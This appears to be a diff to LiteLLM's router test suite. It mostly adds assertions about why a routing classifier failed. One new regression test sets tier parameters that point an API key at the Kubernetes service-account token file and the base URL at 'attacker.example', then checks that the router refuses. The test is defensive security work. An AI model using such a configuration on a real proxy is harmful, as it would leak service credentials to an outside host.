@@ -20,11 +20,12 @@ from unittest.mock import AsyncMock, MagicMock, patch
 import httpx
 import pytest
 import respx
-from pydantic import ValidationError
+from pydantic import TypeAdapter, ValidationError
 
 import litellm
 from litellm import Router
 from litellm.integrations.custom_logger import CustomLogger
+from litellm.types.utils import StandardLoggingRoutingDecision
 from litellm.router_utils.auto_router_model_naming import (
     CUSTOMIZATION_CAPABILITY,
     GATED_AUTO_ROUTER_CAPABILITIES,
@@ -92,7 +93,7 @@ from litellm.types.router import (
     TaggedPreRoutingStrategy,
 )
 from litellm.types.llms.openai import ResponsesAPIResponse
-from litellm.types.management_endpoints.auto_router_endpoints import RequestComplexityRouterConfig
+from litellm.router_strategy.complexity_router.request_models import RequestComplexityRouterConfig
 from litellm.llms.custom_httpx.http_handler import AsyncHTTPHandler
 
 
@@ -484,6 +485,10 @@ class TestComplexityRouterInit:
         assert first.cause != "jev_classifier"
         assert second.cause != "jev_classifier"
         assert client.calls == 1
+        assert first.classifier_failure_reason == "timeout"
+        assert first.classifier_error_type == "TimeoutError"
+        assert second.classifier_failure_reason == "circuit_open"
+        assert second.classifier_error_type is None
         assert _CLASSIFIER_CIRCUIT_OPEN_SIGNAL in second.signals
 
     @pytest.mark.asyncio
@@ -518,6 +523,8 @@ class TestComplexityRouterInit:
         outcome = await router.aclassify("Explain this")
 
         assert outcome.cause != "jev_classifier"
+        assert outcome.classifier_failure_reason == "classifier_error"
+        assert outcome.classifier_error_type == ("RuntimeError" if isinstance(response, RuntimeError) else "ValueError")
 
 
 class TestTokenScoring:
@@ -2741,6 +2748,7 @@ def _llm_response(content: str, response_cost: float | None = None):
     response.choices = [MagicMock()]
     response.choices[0].message.content = content
     response._hidden_params = {} if response_cost is None else {"response_cost": response_cost}
+    response.hidden_params = response._hidden_params
     return response
 
 
@@ -3342,6 +3350,8 @@ class TestCapabilityClassifier:
         assert outcome.tier == ComplexityTier.REASONING
         assert outcome.cause == "capability_classifier_fallback"
         assert outcome.signals == ("capability-classifier-fallback",)
+        assert outcome.classifier_failure_reason == "invalid_response"
+        assert outcome.classifier_error_type == "ValidationError"
 
     @pytest.mark.asyncio
     async def test_classifier_call_failure_fails_closed_to_capable_model(self, mock_router_instance):
@@ -3353,6 +3363,8 @@ class TestCapabilityClassifier:
         )
         assert response.model == "capable-model"
         assert response.routing_decision["cause"] == "capability_classifier_fallback"
+        assert response.routing_decision["classifier_failure_reason"] == "timeout"
+        assert response.routing_decision["classifier_error_type"] == "TimeoutError"
         assert "classifier_p_solve" not in response.routing_decision
         assert "classifier_threshold" not in response.routing_decision
 
@@ -4226,6 +4238,9 @@ class TestLLMClassifier:
         assert first.cause == "heuristic_scorer"
         assert second.cause == "heuristic_scorer"
         assert "classifier-circuit-open" in second.signals
+        assert first.classifier_failure_reason == "timeout"
+        assert second.classifier_failure_reason == "circuit_open"
+        assert second.classifier_error_type is None
         mock_router_instance.acompletion.assert_awaited_once()
 
     def test_classifier_circuit_allows_one_probe_and_closes_on_success(self):
@@ -5342,6 +5357,7 @@ class TestRouterPreRoutingSharedAliasName:
                 "api_key": "sk-marker",
                 "api_base": "https://marker.example/v1",
                 "api_version": "2024-01-01",
+                "responses_api_version": "v1",
             },
         }
         router = Router(model_list=[marker_with_connection_params, self._tier_entry()])
@@ -5357,6 +5373,7 @@ class TestRouterPreRoutingSharedAliasName:
         assert "api_base" not in request_kwargs
         assert "api_key" not in request_kwargs
         assert "api_version" not in request_kwargs
+        assert "responses_api_version" not in request_kwargs
         assert request_kwargs["drop_params"] is True
 
     @pytest.mark.asyncio
@@ -5493,6 +5510,48 @@ class TestRouterPreRoutingSharedAliasName:
 
         assert sent["aws_region_name"] == "us-west-2"
         assert sent["drop_params"] is True
+
+    @pytest.mark.asyncio
+    @pytest.mark.parametrize(
+        "tier_params",
+        [
+            {
+                "api_key": "oidc/file//var/run/secrets/kubernetes.io/serviceaccount/token",
+                "api_base": "https://attacker.example",
+            },
+            {"litellm_credential_name": "admin-oidc", "api_base": "https://attacker.example"},
+        ],
+        ids=["inline_reference", "credential_holding_a_reference"],
+    )
+    async def test_a_tier_cannot_make_the_proxy_read_an_oidc_api_key(self, monkeypatch, tier_params: dict):
+        """A team admin can write an auto-router's tiers, and tier params beat the target deployment's own, so a
+        tier could otherwise send the proxy's own token file to a host the tier picks."""
+        from litellm.types.utils import CredentialItem
+
+        monkeypatch.setattr(
+            litellm,
+            "credential_list",
+            [
+                CredentialItem(
+                    credential_name="admin-oidc",
+                    credential_values={"api_key": "oidc/file//var/run/secrets/kubernetes.io/serviceaccount/token"},
+                    credential_info={},
+                )
+            ],
+        )
+        marker = self._region_marker_entry()
+        marker["litellm_params"]["complexity_router_config"] = {
+            "tiers": {
+                tier: {"model_name": "bedrock-tier", "litellm_params": tier_params}
+                for tier in ("SIMPLE", "MEDIUM", "COMPLEX", "REASONING")
+            }
+        }
+        tier_target = self._bedrock_tier_entry()
+        tier_target["litellm_params"]["mock_response"] = "sent upstream"
+        router = Router(model_list=[marker, tier_target])
+
+        with pytest.raises(ValueError, match="oidc/"):
+            await router.acompletion(model="smart-router", messages=[{"role": "user", "content": "hi"}])
 
     @pytest.mark.asyncio
     async def test_a_markers_explicit_flag_beats_the_tiers_pydantic_default(self):
@@ -8189,18 +8248,24 @@ class TestClassifierPlugin:
         router = _plugin_router(mock_router_instance, _FixedTierClassifier(None))
         outcome = await router.aclassify("what is 2+2?")
         assert outcome.cause == "heuristic_scorer"
+        assert outcome.classifier_failure_reason == "declined"
+        assert outcome.classifier_error_type is None
 
     @pytest.mark.asyncio
     async def test_plugin_error_falls_back_to_heuristic(self, mock_router_instance):
         router = _plugin_router(mock_router_instance, _RaisingClassifier())
         outcome = await router.aclassify("what is 2+2?")
         assert outcome.cause == "heuristic_scorer"
+        assert outcome.classifier_failure_reason == "classifier_error"
+        assert outcome.classifier_error_type == "RuntimeError"
 
     @pytest.mark.asyncio
     async def test_plugin_timeout_falls_back_to_heuristic(self, mock_router_instance):
         router = _plugin_router(mock_router_instance, _SlowClassifier(), classifier_plugin_timeout_ms=20)
         outcome = await router.aclassify("what is 2+2?")
         assert outcome.cause == "heuristic_scorer"
+        assert outcome.classifier_failure_reason == "timeout"
+        assert outcome.classifier_error_type == "TimeoutError"
 
     @pytest.mark.asyncio
     async def test_plugin_non_string_verdict_falls_back_to_heuristic(self, mock_router_instance):
@@ -8208,12 +8273,16 @@ class TestClassifierPlugin:
         router = _plugin_router(mock_router_instance, _FixedTierClassifier(42))
         outcome = await router.aclassify("what is 2+2?")
         assert outcome.cause == "heuristic_scorer"
+        assert outcome.classifier_failure_reason == "invalid_response"
+        assert outcome.classifier_error_type is None
 
     @pytest.mark.asyncio
     async def test_plugin_unknown_tier_falls_back_to_heuristic(self, mock_router_instance):
         router = _plugin_router(mock_router_instance, _FixedTierClassifier("galactic"))
         outcome = await router.aclassify("what is 2+2?")
         assert outcome.cause == "heuristic_scorer"
+        assert outcome.classifier_failure_reason == "invalid_response"
+        assert outcome.classifier_error_type is None
 
     @pytest.mark.asyncio
     async def test_plugin_tier_without_pool_falls_back(self, mock_router_instance):
@@ -8229,6 +8298,8 @@ class TestClassifierPlugin:
         )
         outcome = await router.aclassify("what is 2+2?")
         assert outcome.cause == "heuristic_scorer"
+        assert outcome.classifier_failure_reason == "invalid_response"
+        assert outcome.classifier_error_type is None
 
     @pytest.mark.asyncio
     async def test_plugin_failure_with_default_model_fallback(self, mock_router_instance):
@@ -9562,6 +9633,101 @@ class TestRedactedLoggingDropsPromptText:
         decision = await self._decision(request_kwargs)
         assert "matched_keyword" not in decision
         assert decision["cause"] == "literal_keyword_match"
+
+
+@pytest.mark.asyncio
+@pytest.mark.parametrize(
+    "overrides, expected_cause",
+    [
+        ({"classifier_type": "llm"}, "heuristic_scorer"),
+        ({"classifier_type": "llm", "classifier_fallback": "default_model"}, "default_model_fallback"),
+        (
+            {
+                "classifier_type": "capability",
+                "capability_classifier_config": {
+                    "efficient_tier": "SIMPLE", "capable_tier": "REASONING",
+                    "base_threshold": 0.5, "threshold_step": 0.1,
+                },
+            },
+            "capability_classifier_fallback",
+        ),
+        (
+            {
+                "classifier_type": "llm_v2",
+                "llm_v2_config": {
+                    "efficient_profile": "Routine tasks", "capable_profile": "Complex tasks",
+                    "harness": "Read files and run checks", "max_quality_gap": 0.05,
+                },
+            },
+            "llm_v2_fallback",
+        ),
+    ],
+)
+async def test_classifier_failure_survives_real_router_decision_and_redaction(
+    overrides: Mapping[str, object], expected_cause: str, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    monkeypatch.setattr(litellm, "disable_aiohttp_transport", True)
+    router: Final = Router(model_list=[
+        {
+            "model_name": "auto",
+            "litellm_params": {
+                "model": "auto_router/complexity_router",
+                "complexity_router_config": {
+                    "tiers": {"SIMPLE": "cheap", "REASONING": "capable"},
+                    "default_model": "cheap",
+                    "classifier_llm_config": {"model": "classifier", "timeout_ms": 2000},
+                    **overrides,
+                },
+            },
+        },
+        {
+            "model_name": "classifier",
+            "litellm_params": {
+                "model": "openai/test-classifier", "api_key": "test-key",
+                "api_base": "https://classifier.test/v1",
+            },
+        },
+        {"model_name": "cheap", "litellm_params": {"model": "openai/test-cheap", "api_key": "test-key"}},
+        {"model_name": "capable", "litellm_params": {"model": "openai/test-capable", "api_key": "test-key"}},
+    ])
+    with respx.mock:
+        upstream: Final = respx.post("https://classifier.test/v1/chat/completions").respond(
+            200,
+            json={
+                "id": "classifier-result", "object": "chat.completion", "model": "test-classifier",
+                "choices": [{"index": 0, "message": {"role": "assistant", "content": "PRIVATE_INVALID_REPLY"},
+                             "finish_reason": "stop"}],
+            },
+        )
+        metadata: Final[dict[str, object]] = {"headers": {"x-litellm-enable-message-redaction": True}}
+        request: Final[dict[str, object]] = {"metadata": metadata, "turn_off_message_logging": True}
+        response: Final = await router.async_pre_routing_hook(
+            model="auto", request_kwargs=request, messages=[{"role": "user", "content": "hi"}]
+        )
+        assert upstream.called
+        assert response is not None and response.routing_decision is not None
+        decision: Final = TypeAdapter(StandardLoggingRoutingDecision).validate_python(metadata["routing_decision"])
+        assert decision["cause"] == expected_cause
+        assert decision["classifier_failure_reason"] == "invalid_response"
+        assert decision["classifier_error_type"] == "ValidationError"
+        assert "PRIVATE_INVALID_REPLY" not in json.dumps(decision)
+        assert "signals" not in decision
+        if overrides["classifier_type"] == "llm":
+            upstream.respond(200, json={
+                "id": "classifier-recovered", "object": "chat.completion", "model": "test-classifier",
+                "choices": [{"index": 0, "message": {"role": "assistant", "content": '{"tier":"SIMPLE"}'},
+                             "finish_reason": "stop"}],
+            })
+            recovered: Final = await router.async_pre_routing_hook(
+                model="auto", request_kwargs=request, messages=[{"role": "user", "content": "hi"}]
+            )
+            assert recovered is not None and recovered.routing_decision is not None
+            assert recovered.routing_decision["cause"] == "llm_classifier"
+            recovered_decision: Final = TypeAdapter(StandardLoggingRoutingDecision).validate_python(
+                metadata["routing_decision"]
+            )
+            assert "classifier_failure_reason" not in recovered_decision
+            assert "classifier_error_type" not in recovered_decision
 
 
 def test_every_routing_decision_field_is_classified():
@@ -14148,6 +14314,8 @@ async def test_v2_chain_judge_failure_uses_selected_fallback(
     assert outcome.cause == ("heuristic_v2" if fallback == "heuristic" else "default_model_fallback")
     assert outcome.tier == (ComplexityTier.COMPLEX if fallback == "heuristic" else ComplexityTier.MEDIUM)
     assert (outcome.heuristic_v2_forecast is not None) == (fallback == "heuristic")
+    assert outcome.classifier_failure_reason == "classifier_error"
+    assert outcome.classifier_error_type == "RuntimeError"
     assert dependency.aresponses.await_count == int(encrypted)
     assert dependency.acompletion.await_count == int(not encrypted)
 
@@ -14227,13 +14395,9 @@ class TestContextWindowEscalation:
 
     @pytest.mark.asyncio
     @pytest.mark.usefixtures("local_model_cost_map")
-    async def test_a_window_declared_only_through_base_model_escalates_too(self):
-        """A Bedrock application inference profile ARN has no cost-map row; its window exists
-        only through `model_info.base_model`. The gate used to resolve that deployment to no
-        window at all (base_model was read for azure only), treat it as infinite, and leave an
-        oversized SIMPLE prompt on it to 400 at the provider."""
+    async def test_an_inference_profile_window_declared_only_through_base_model_escalates_too(self):
         base_model: Final = "meta.llama3-8b-instruct-v1:0"
-        base_window: Final = litellm.get_model_info(model=f"bedrock/{base_model}")["max_input_tokens"]
+        base_window: Final = litellm.get_model_info(model=base_model)["max_input_tokens"]
         assert base_window is not None
         litellm_router: Final = Router(
             model_list=[
